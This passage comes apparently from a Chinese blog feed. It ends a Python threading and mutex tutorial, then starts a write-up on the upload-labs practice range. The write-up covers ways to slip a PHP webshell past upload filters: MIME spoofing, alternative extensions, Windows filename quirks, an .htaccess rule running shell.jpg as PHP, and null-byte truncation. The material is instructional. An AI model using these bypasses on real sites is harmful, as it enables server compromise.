class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> temp <span class="keyword">in</span> names:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(temp)</span><br><span class="line">...</span><br><span class="line">aa</span><br><span class="line">bb</span><br><span class="line">cc</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(temp)</span><br><span class="line">...</span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;cc&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> key,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(key,value)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> aa</span><br><span class="line"><span class="number">1</span> bb</span><br><span class="line"><span class="number">2</span> cc</span><br></pre></td></tr></table></figure><p>通过 for 与 enumerate() 返回一个键值对，我们可以直接在写 for时进行拆包。</p><p>线程的执行是没有先后顺序的，不确定的，这取决于内核的调度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----test1-----%d----&#x27;</span> % i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----test2-----%d----&#x27;</span> % i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">t1 = threading.Thread(target=test1)</span><br><span class="line">t2 = threading.Thread(target=test2)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">t2.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>这里通过让主线程 sleep 一秒钟来达到使 t1.start开启的线程先执行完，然后 t2.start 开启的线程再执行完，最后再执行 print线程数目的目的。我们可以通过调整增减 time.sleep() 在 t1.start()、t2.start() 以及他们执行的函数中的位置来调整打印线程。</p><p>通过以下测试我们也可以知道，线程创建是在 t1.start() 的时候。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> threading</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&#x27;----1----&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1 = threading.Thread(target=test)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1.start()</span><br><span class="line">----<span class="number">1</span>----</span><br></pre></td></tr></table></figure><p>我们可以使用 len 函数 通过判断 threading.enumerate()的长度个数来判断是否子线程是否结束。</p><h1 id="常用方法">常用方法</h1><p>Thread 类中常用方法：</p><h2 id="thread">Thread()</h2><blockquote><p><code>Thread</code>(<em>group=None</em>, <em>target=None</em>,<em>name=None</em>, <em>args=()</em>, <em>kwargs={}</em>, <em>**,</em>daemon=None*)</p></blockquote><p>常用到的参数： <em>target</em> ：run()方法调用的对象，即该线程做的事情，一般我们就写一个函数名</p><p><em>name</em> : 线程的名字，默认情况下，会自动构造一个 “Thread-N”格式（其中 N 是一个小的十进制数）的唯一的名字。</p><p><em>args</em> : 一个参数<strong>元组</strong>，用来向 target参数的对象传递参数</p><h2 id="run">run():</h2><p>用以表示线程活动的方法，当线程的 run() 方法结束时，该线程结束。</p><h2 id="start">start():</h2><p>启动线程活动，一个线程对象最多只能调用一次。它为对象的 run()方法准备一个独立分离的控制线程。</p><h2 id="jointimeoutnone">join(timeout=None)</h2><p>等待至线程中止。此方法会阻塞调用线程，直至线程的 join()方法被调用中止（正常退出或者抛出未处理的异常或者是可选的超时发生。）</p><p>一般使用它来阻塞主线程，等待子线程结束，然后主线程去做后面的事情。</p><p>常见的场景是：将创建的多线程放到一个列表中，然后，当你想要保证主线程在所有子线程结束后做一些事情时，就要用到join，我们可以使用 for遍历多线程列表，从而阻塞主线程，直到每个子线程都结束之后，解堵塞。（join是针对单个线程，我们循环就可以对每个线程依次 join）</p><h1 id="多线程共享全局变量">多线程共享全局变量</h1><p>在一个进程中的所有线程共享全局变量，有一个缺点：线程是对全局变量随意修改，可能造成多线程之间对全局变量的混乱（即线程非安全）</p><p>如果多个线程同时对同一个全局变量操作，会出现资源竞争问题，从而数据结果会不正确。</p><h2 id="全局变量">全局变量</h2><p>如果想要在一个函数里面修改全局变量，不一定需要使用 global关键字。</p><p>两种情况：</p><p>如果你要修改全局变量地址里面的值，可以直接修改。（当然，有的变量是不可修改的。）</p><p>如果你要修改全局变量的指向（即：使用包含 =在内的一串赋值运算），那就不能直接修改，需要使用 global。</p><p>即：</p><p>如一个函数中，对全局变量进行修改的时候，是否需要使用global，要看是否对函数的指向进行了修改。</p><p>如果修改了执行，即让全局变量指向了一个新的地方，那么必须使用 global，如果，仅仅是修改了指向的空间中的数据，此时不必使用 global。</p><p>不修改，仅仅是获取全局变量，就不需要使用 global。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">100</span></span><br><span class="line">nums = [<span class="number">12</span>,<span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="keyword">global</span> num</span><br><span class="line">num += <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">nums.append(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">test1()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br><span class="line"></span><br><span class="line">D:\python_workspace\multi_task&gt;py modify_global_var_in_func.py</span><br><span class="line"><span class="number">100</span></span><br><span class="line">[<span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"><span class="number">200</span></span><br><span class="line">[<span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure><p>传参方式验证多线程共享全局变量</p><p>注意：args要传一个元组，如果元祖只有一个参数，那么需要加个逗号，表明它是元祖。</p><p>即：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g_num = [<span class="number">1.2</span>]</span><br><span class="line">t1 = threading.Thread(target=test1, args=(g_num,))</span><br><span class="line"></span><br><span class="line">test = <span class="number">1</span></span><br><span class="line">t1 = threading.Thread(target=test1, args=(test,))</span><br></pre></td></tr></table></figure><p>传参时这样写，写一个括号，括号内写传的参数然后用逗号隔开，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>((<span class="number">1</span>))</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>((<span class="number">1</span>,))</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>共享全局变量的问题</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/multi_threading_basic.png" /></p><p>共享全局变量会造成资源竞争问题，执行次数越多出现错误的可能性越大</p><h1 id="同步">同步</h1><p>同步就是协同步调，按照预定的先后次序进行运行。</p><p>对于共享全局变量造成的资源竞争的问题，我们可以通过线程同步来解决，即：加锁。</p><h1 id="互斥锁原子性">互斥锁（原子性）</h1><p>当多个线程几乎同时修改某一个共享数据的时候（即同时进入临界区时），需要进行同步控制。</p><p>某个线程要更改共享数据时，先将其锁定。此时，资源的状态为“锁定”，其他线程不能更改。直到该线程释放资源，将资源状态变成“非锁定”。其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。</p><p>常见临界区：</p><ol type="1"><li>修改某些临界变量等</li><li>多线程输出（向屏幕或者文件），容易造成粘连。</li></ol><h2 id="步骤">步骤</h2><h3 id="创建锁">创建锁</h3><p><code>mutex = threading.Lock()</code></p><h3 id="上锁锁定">上锁（锁定）</h3><p><code>mutex = acquire()</code></p><p>上锁，如果之前没有被上锁，那么此时上锁成功。如果上锁之前已经被上锁了，那么此时会堵塞在这里，知道这个锁被解开。</p><h3 id="释放锁资源">释放锁资源</h3><p><code>mutex.release()</code></p><p>上锁有一个原则：在实现功能的前提下，上锁的代码越少越好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个全局变量</span></span><br><span class="line">g_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">num</span>):</span><br><span class="line"><span class="keyword">global</span> g_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">mutex.acquire()</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----in test1 g_num=%d---&#x27;</span> % g_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">num</span>):</span><br><span class="line"><span class="keyword">global</span> g_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">mutex.acquire()</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----in test2 g_num=%d---&#x27;</span> % g_num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个互斥锁，默认是没有上锁的</span></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">t1 = threading.Thread(target=test1,args=(<span class="number">10000</span>,))</span><br><span class="line">t2 = threading.Thread(target=test2,args=(<span class="number">10000</span>,))</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待上面的两个线程执行完毕</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>上面的加锁，有两种方式：</p><p>将锁加在 for 循环里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">mutex.acquire()</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br></pre></td></tr></table></figure><p>这种情况下，只对 <code>g_num += 1</code>进行加锁，那么多个线程的每次循环可能交叉运行，比如：线程一进行一次循环，然后线性二执行一次循环。此方法，不保证单个线程结果的唯一性与准确性，只保证多个线程的最后结果的唯一性与准确性。</p><p>将锁加在 for 循环外面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mutex.acquire()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">g_num += <span class="number">1</span></span><br><span class="line">mutex.release()</span><br></pre></td></tr></table></figure><p>这种情况下，多个线程的 for 循环不会交叉。只有一个线程的全部的 for循环执行完毕后，另一个线程才可以获得锁资源。此方法，保证了本线程结果的唯一性与准确性。</p><h1 id="死锁问题">死锁问题</h1><p>死锁问题解决多个锁相互冲突的情况。比如：线程一对 mutexA上锁，线程二对 mutexB上锁，线程一、二在其上的锁未释放的情况下，又申请对方的锁，这样就会产生相互等待的死锁问题。</p><p>避免死锁：</p><ol type="1"><li>程序设计时要尽量避免</li><li>添加超时时间</li></ol><p>参考资料：</p><p><ahref="https://docs.python.org/3/library/threading.html">官方手册</a></p><p><a href="https://github.com/lhchen74/python-note">python-note</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/blog/2019/08/25/websec/file_upload/file_upload/"/>
      <url>/blog/2019/08/25/websec/file_upload/file_upload/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/theLSA/upload-labs">upload-labs靶场</a></p><h1 id="预备知识">预备知识</h1><h2 id="发现及利用">发现及利用</h2><p>会员注册上传功能，扫描工具扫出的上传点，后台管理系统上传功能等。</p><h2 id="危害">危害</h2><p>攻击者可以通过上传漏洞获取当前网站的权限，webshell 权限。</p><h2 id="过滤手段">过滤手段</h2><p>文件上传按照对上传文件的后缀名的限制分为：黑名单过滤与白名单过滤。</p><h2 id="判断木马是否解析">判断木马是否解析</h2><p>如果是一句话的话</p><p>找到图片的地址访问它（一般是，右键新标签页打开图片网址），看看网页内容，</p><ol type="1"><li><p>传的只有代码，</p><p>如果原原本本地把你的文件内容显示出来那是当做文本解析了，失败。如果是空白，那就好了，说明当做代码解析了。</p></li><li><p>传的是图片马</p><p>只要不正常显示图片，显示图片乱码啥的，就可以认为正常解析了。</p></li></ol><p>当然，我们再用 Cknife 或中国蚁剑去连接试试就行了。</p><p>如果是由 Web 图形界面的大马</p><p>直接看图形界面显示没有就行了。</p><h1 id="前端-javascript-限制">前端 Javascript 限制</h1><p>前端 JS 限制上传文件的后缀名，常用绕过方法：</p><ol type="1"><li>浏览器禁用 Javascript</li><li>先上传改为图片后缀的代码文件，然后 Burp代理抓包，改后缀名为对应可解析代码的后缀名。</li><li>修改或删减 Javascript 代码</li></ol><p>注意：区分前端与后端限制：</p><ol type="1"><li><p>后端限制一般为页面回显的文字提示。JS前端限制一般为弹窗提示（不仅仅局限于文件上传）。</p><p>如果什么时候，你看到浏览器弹窗，就要知道这是前端 JS 代码的操作，禁用JS 或 抓包绕过，这两种方法就要浮现在眼前。此外，如果是前端限制，在chrome Dev tools 的 Elements 中，Ctrl + F，便可以搜到提示文字。</p></li><li><p>前端限制不需要服务器发包，不会刷新页面。后端限制要向服务器发包之后，会刷新页面</p></li></ol><p>实例</p><p>upload labs 第一关</p><h1 id="后端-mime_types-白名单">后端 MIME_types 白名单</h1><p>如果是上传图片的话，就只会允许 image/jpeg、image/gif image/png等图片相关的 MIME TYPE 上传。</p><blockquote><p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose InternetMail Extensions</strong> 或 <strong>MIME</strong> 类型）是一种标准，用来表示文档、文件或字节流的性质和格式重要：**浏览器通常使用MIME 类型（而不是文件扩展名）来确定如何处理 URL，因此 Web服务器在响应头中添加正确的 MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p></blockquote><p>摘自：<ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME类型</a></p><p>它位于 HTTP header 的 <strong>Content</strong>-<strong>Type</strong>字段。</p><p><ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types">常见MIME 类型列表</a></p><p>常见的类型：</p><ul><li><p>jpg 与 jpeg 都是 image/jpeg 类型</p></li><li><p>gif 是 image/gif 类型，png 是 image/png 类型。</p></li><li><p><code>text/plain</code>表示文本文件的默认值。一个文本文件应当是人类可读的，并且不包含二进制数据。</p></li><li><p><code>application/octet-stream</code>表示所有其他情况的默认值。一种未知的文件类型应当使用此类型。浏览器在处理这些文件时会特别小心,试图防止、避免用户的危险行为.</p></li></ul><p>如何确定后端在某些 HTTP 头上的限制（这里就是：MIME TYPE 限制）</p><p>这里讲一个通用的方法，当然，如果只是看 MIME-TYPES不用这么麻烦，直接看就行啦。</p><p>上传正常后缀图片文件，抓包发送到 comparer，同样的上传 php后缀代码文件，抓包发送到 comparer。二者对比，看看 header头有哪些不一样的地方。当然，我们这里需要判断 Content-type 字段，那就看content-type 是否一样，甚至可以去 Repeater 发包验证是不是 MIME-TYPES限制，如果是的话，我们上传 php 文件，抓包改掉 content-type就可以了。</p><h1 id="后端后缀名黑名单">后端后缀名黑名单</h1><p>如果是某些代码后缀名或配置文件后缀名，便禁止上传。</p><p>绕过方式：</p><h2 id="黑名单不全">黑名单不全</h2><p>过滤的后缀名不全</p><p>尝试 Web 中间件（Apache，IIS，Nginx等）其他的可以解析的但是黑名单没有过滤的后缀名。适用于黑名单不全的情况，要是黑名单比较全，那这个方式就不好使了。</p><p>对 Apache 与 PHP 来说（其他的思路大致一样）</p><p>Apache PHP常见的有：php3，php4，php5，php6，phtml，phps，pht，但是要想让 Apache解析前提是下面将的配置文件中配置了它。</p><p>理论基础：</p><p>首先在 Apache 和 PHP 以 Module 的<ahref="https://blog.csdn.net/sinat_22991367/article/details/73431316">方式结合</a>的情况下（我们一个个研压缩包安装的，就是Module 方式结合，其他的还没了解过 emm），自己配置过环境的都知道，在Apache 的 conf/httpd.conf 配置文件中，我们需要加载 PHP 的一些模块、配置PHP 路径，并且需要配置添加 Apache 要把哪些后缀名的文件交给 PHP解析。</p><p>而下面这语句就是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure><p>这里面的后缀名就是正常情况下，Apache可以解析的后缀名，如果黑名单屏蔽不全的话，我们便可以使用其中之一绕过，如果都屏蔽了，那这个方法就凉了。</p><p>过滤逻辑有问题</p><p>对于有的黑名单过滤，只过滤一次后缀 php的，可以采用双写文件名绕过，文件名改成<code>xx.pphphp</code></p><p>实例：upload lab Pass 10</p><h2 id="操作系统特性">操作系统特性</h2><p>windows 系统下</p><ol type="1"><li><p>在 Linux 没有特殊配置的情况下，这种情况只有 Windows 可以，因为Windows 会忽略大小写，因此我们可以尝试大小写绕过。当然，因为 linux环境下，路径是区分大小写的，在 apache 部署下的 web应用，有时候出现大小写不匹配导致无法访问。我们也可以配置 apache支持不区分大小写，这就要通过 speling_module模块了。这我们知道就好了。</p><p>实例：upload labs Pass 5</p></li><li><p>Win下<code>xx.jpg[空格] 或 xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个<code>.php空格</code>文件即可。需要知道的是，如果黑名单对你的后缀名进行了去点、去空格操作，这种方法就不太好使了。当然，如果他的去除逻辑有问题，我们便可以绕过。</p><p>实例：upload lab Pass 6，Pass 7，Pass 9</p></li><li><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$DATA</code>。上传<code>.php::$DATA</code>绕过。(仅限windows)</p></li></ol><h2 id="重写文件解析规则">重写文件解析规则</h2><p>上传中间件的相关配置文件，是自己的文件被对应脚本语言解析。</p><p>Apache 当后缀名没有过滤 .htaccess 时，我们可以上传 <ahref="https://www.jianshu.com/p/81305ca91ebd">.htaccess文件</a>，通过它来配置我们上传的文件被 PHP 解析。</p><p>上传 <code>.htaccess</code>文件需要：httpd.conf 中的</p><p>1.<code>mod_rewrite模块开启</code>，这个作用是允许在 httpd.conf外重写配置</p><p>2.<code>AllowOverride All</code>，这个作用是允许重写覆盖相关配置</p><p>我们上传的 .htaccess 文件内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.jpg</span>&quot;&gt;</span></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>意思是：匹配文件 shell.jpg，将此名的文件都交给 PHP 解析处理。</p><p>这种方法在它会随机改上传文件的名字的情况下，就不好使了（可以看看 Pass3，就是这样）。一方面文件名改成了由时间名组成的文件名，这样我们的配置文件当然不能生效了。另一方面，在配置文件我们写的是：将shell.jpg 当做 php 执行，可是，我们的 shell.jpg 也被改名字了。</p><p>实例：</p><p>upload labs Pass 2 与 Pass 3 分别对应方法一和二。</p><h1 id="脚本语言函数特性">脚本语言函数特性</h1><p>这里当然是拿 PHP 来举例了。</p><p>1.move_uploaded_file`函数的 00 截断漏洞绕过。</p><p>PHP 任意文件上传漏洞<ahref="https://www.cnblogs.com/cyjaysun/p/4390930.html">CVE-2015-2348浅析</a></p><p>对于 GET 方式 传路径</p><p>上传的文件名写成<code>hello.jpg</code>, save_path改成<code>../upload/shell.php%00</code>，最后保存下来的文件就是<code>11.php</code>。</p><p><ahref="http://www.cnblogs.com/cyjaysun/p/4390930.html">CVE-2015-2348</a>影响版本：<code>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</code></p><p>对于 POST 方式传路径，由于 POST 方式不会进行 URL 解码，我们需要将%00进行 URL Decode 或者直接在 hex 处增加 00。</p><p>上传文件名的后缀名改为正常的后缀名，.jpg，然后，在/upload/ 后面加个shell.php+，然后，去 hex 下，将+对应的 2b 改为 00 因为用 post获取路径，不会像 get 一样自动 url 解码。所以，用 hex 将空格（20）改为 00或者 %00 再右键 url decode</p><p>实例：Upload labs 11</p><p>2.利用<code>pathinfo</code>的特性绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="string">&quot;/testweb/shell.php/.&quot;</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="string">&#x27;/testweb/shell.php\00.jpg&#x27;</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;jpg&quot;</span></span><br></pre></td></tr></table></figure><p>在后缀名后面加 <code>/.</code> pathinfo获取到空的后缀名，从而绕过黑名单。然后 Window 文件后缀名会去掉<code>/</code>、<code>.</code>及`<code>，因此它就被识别为了 PHP。当然，利用</code>\00<code>绕过，</code>move_uploaded_file<code>会忽略后面的</code>.jpg`</p><p>实例：Upload labs Pass 19</p><p>3.<code>end</code>与<code>count</code>的函数特性</p><p>end()函数将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</p><p>count() 函数返回数组中元素的数目.</p><p>Pass 20 关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">....</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p><code>end</code>取的是数据的最后一个元素，无论下标（感觉 PHP的数组有点类似 C 语言数组和结构体的合体，haha），</p><p><code>count($arr)-1</code>取的是下标为总个数简易的元素。</p><p>reset函数将数组的指针移到第一个元素，并返回它的值。这里是用来从数组中取文件名字。</p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;0&quot;</span>=&gt;<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;2&quot;</span>=&gt;<span class="string">&quot;php&quot;</span>, <span class="string">&quot;1&quot;</span>=&gt;<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;jpg&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;php&quot;</span></span><br></pre></td></tr></table></figure><p>我们创建了一个数组，数组顺序不是按照寻常的顺序的，我们故意把最后一个元素排在了前面一位，这样<code>end</code>就取到了<code>jpg</code>后缀，这样我们就可以利用<code>$_POST[save_name]</code>来绕过最后后缀检测了</p><p>数组绕过，利用 end 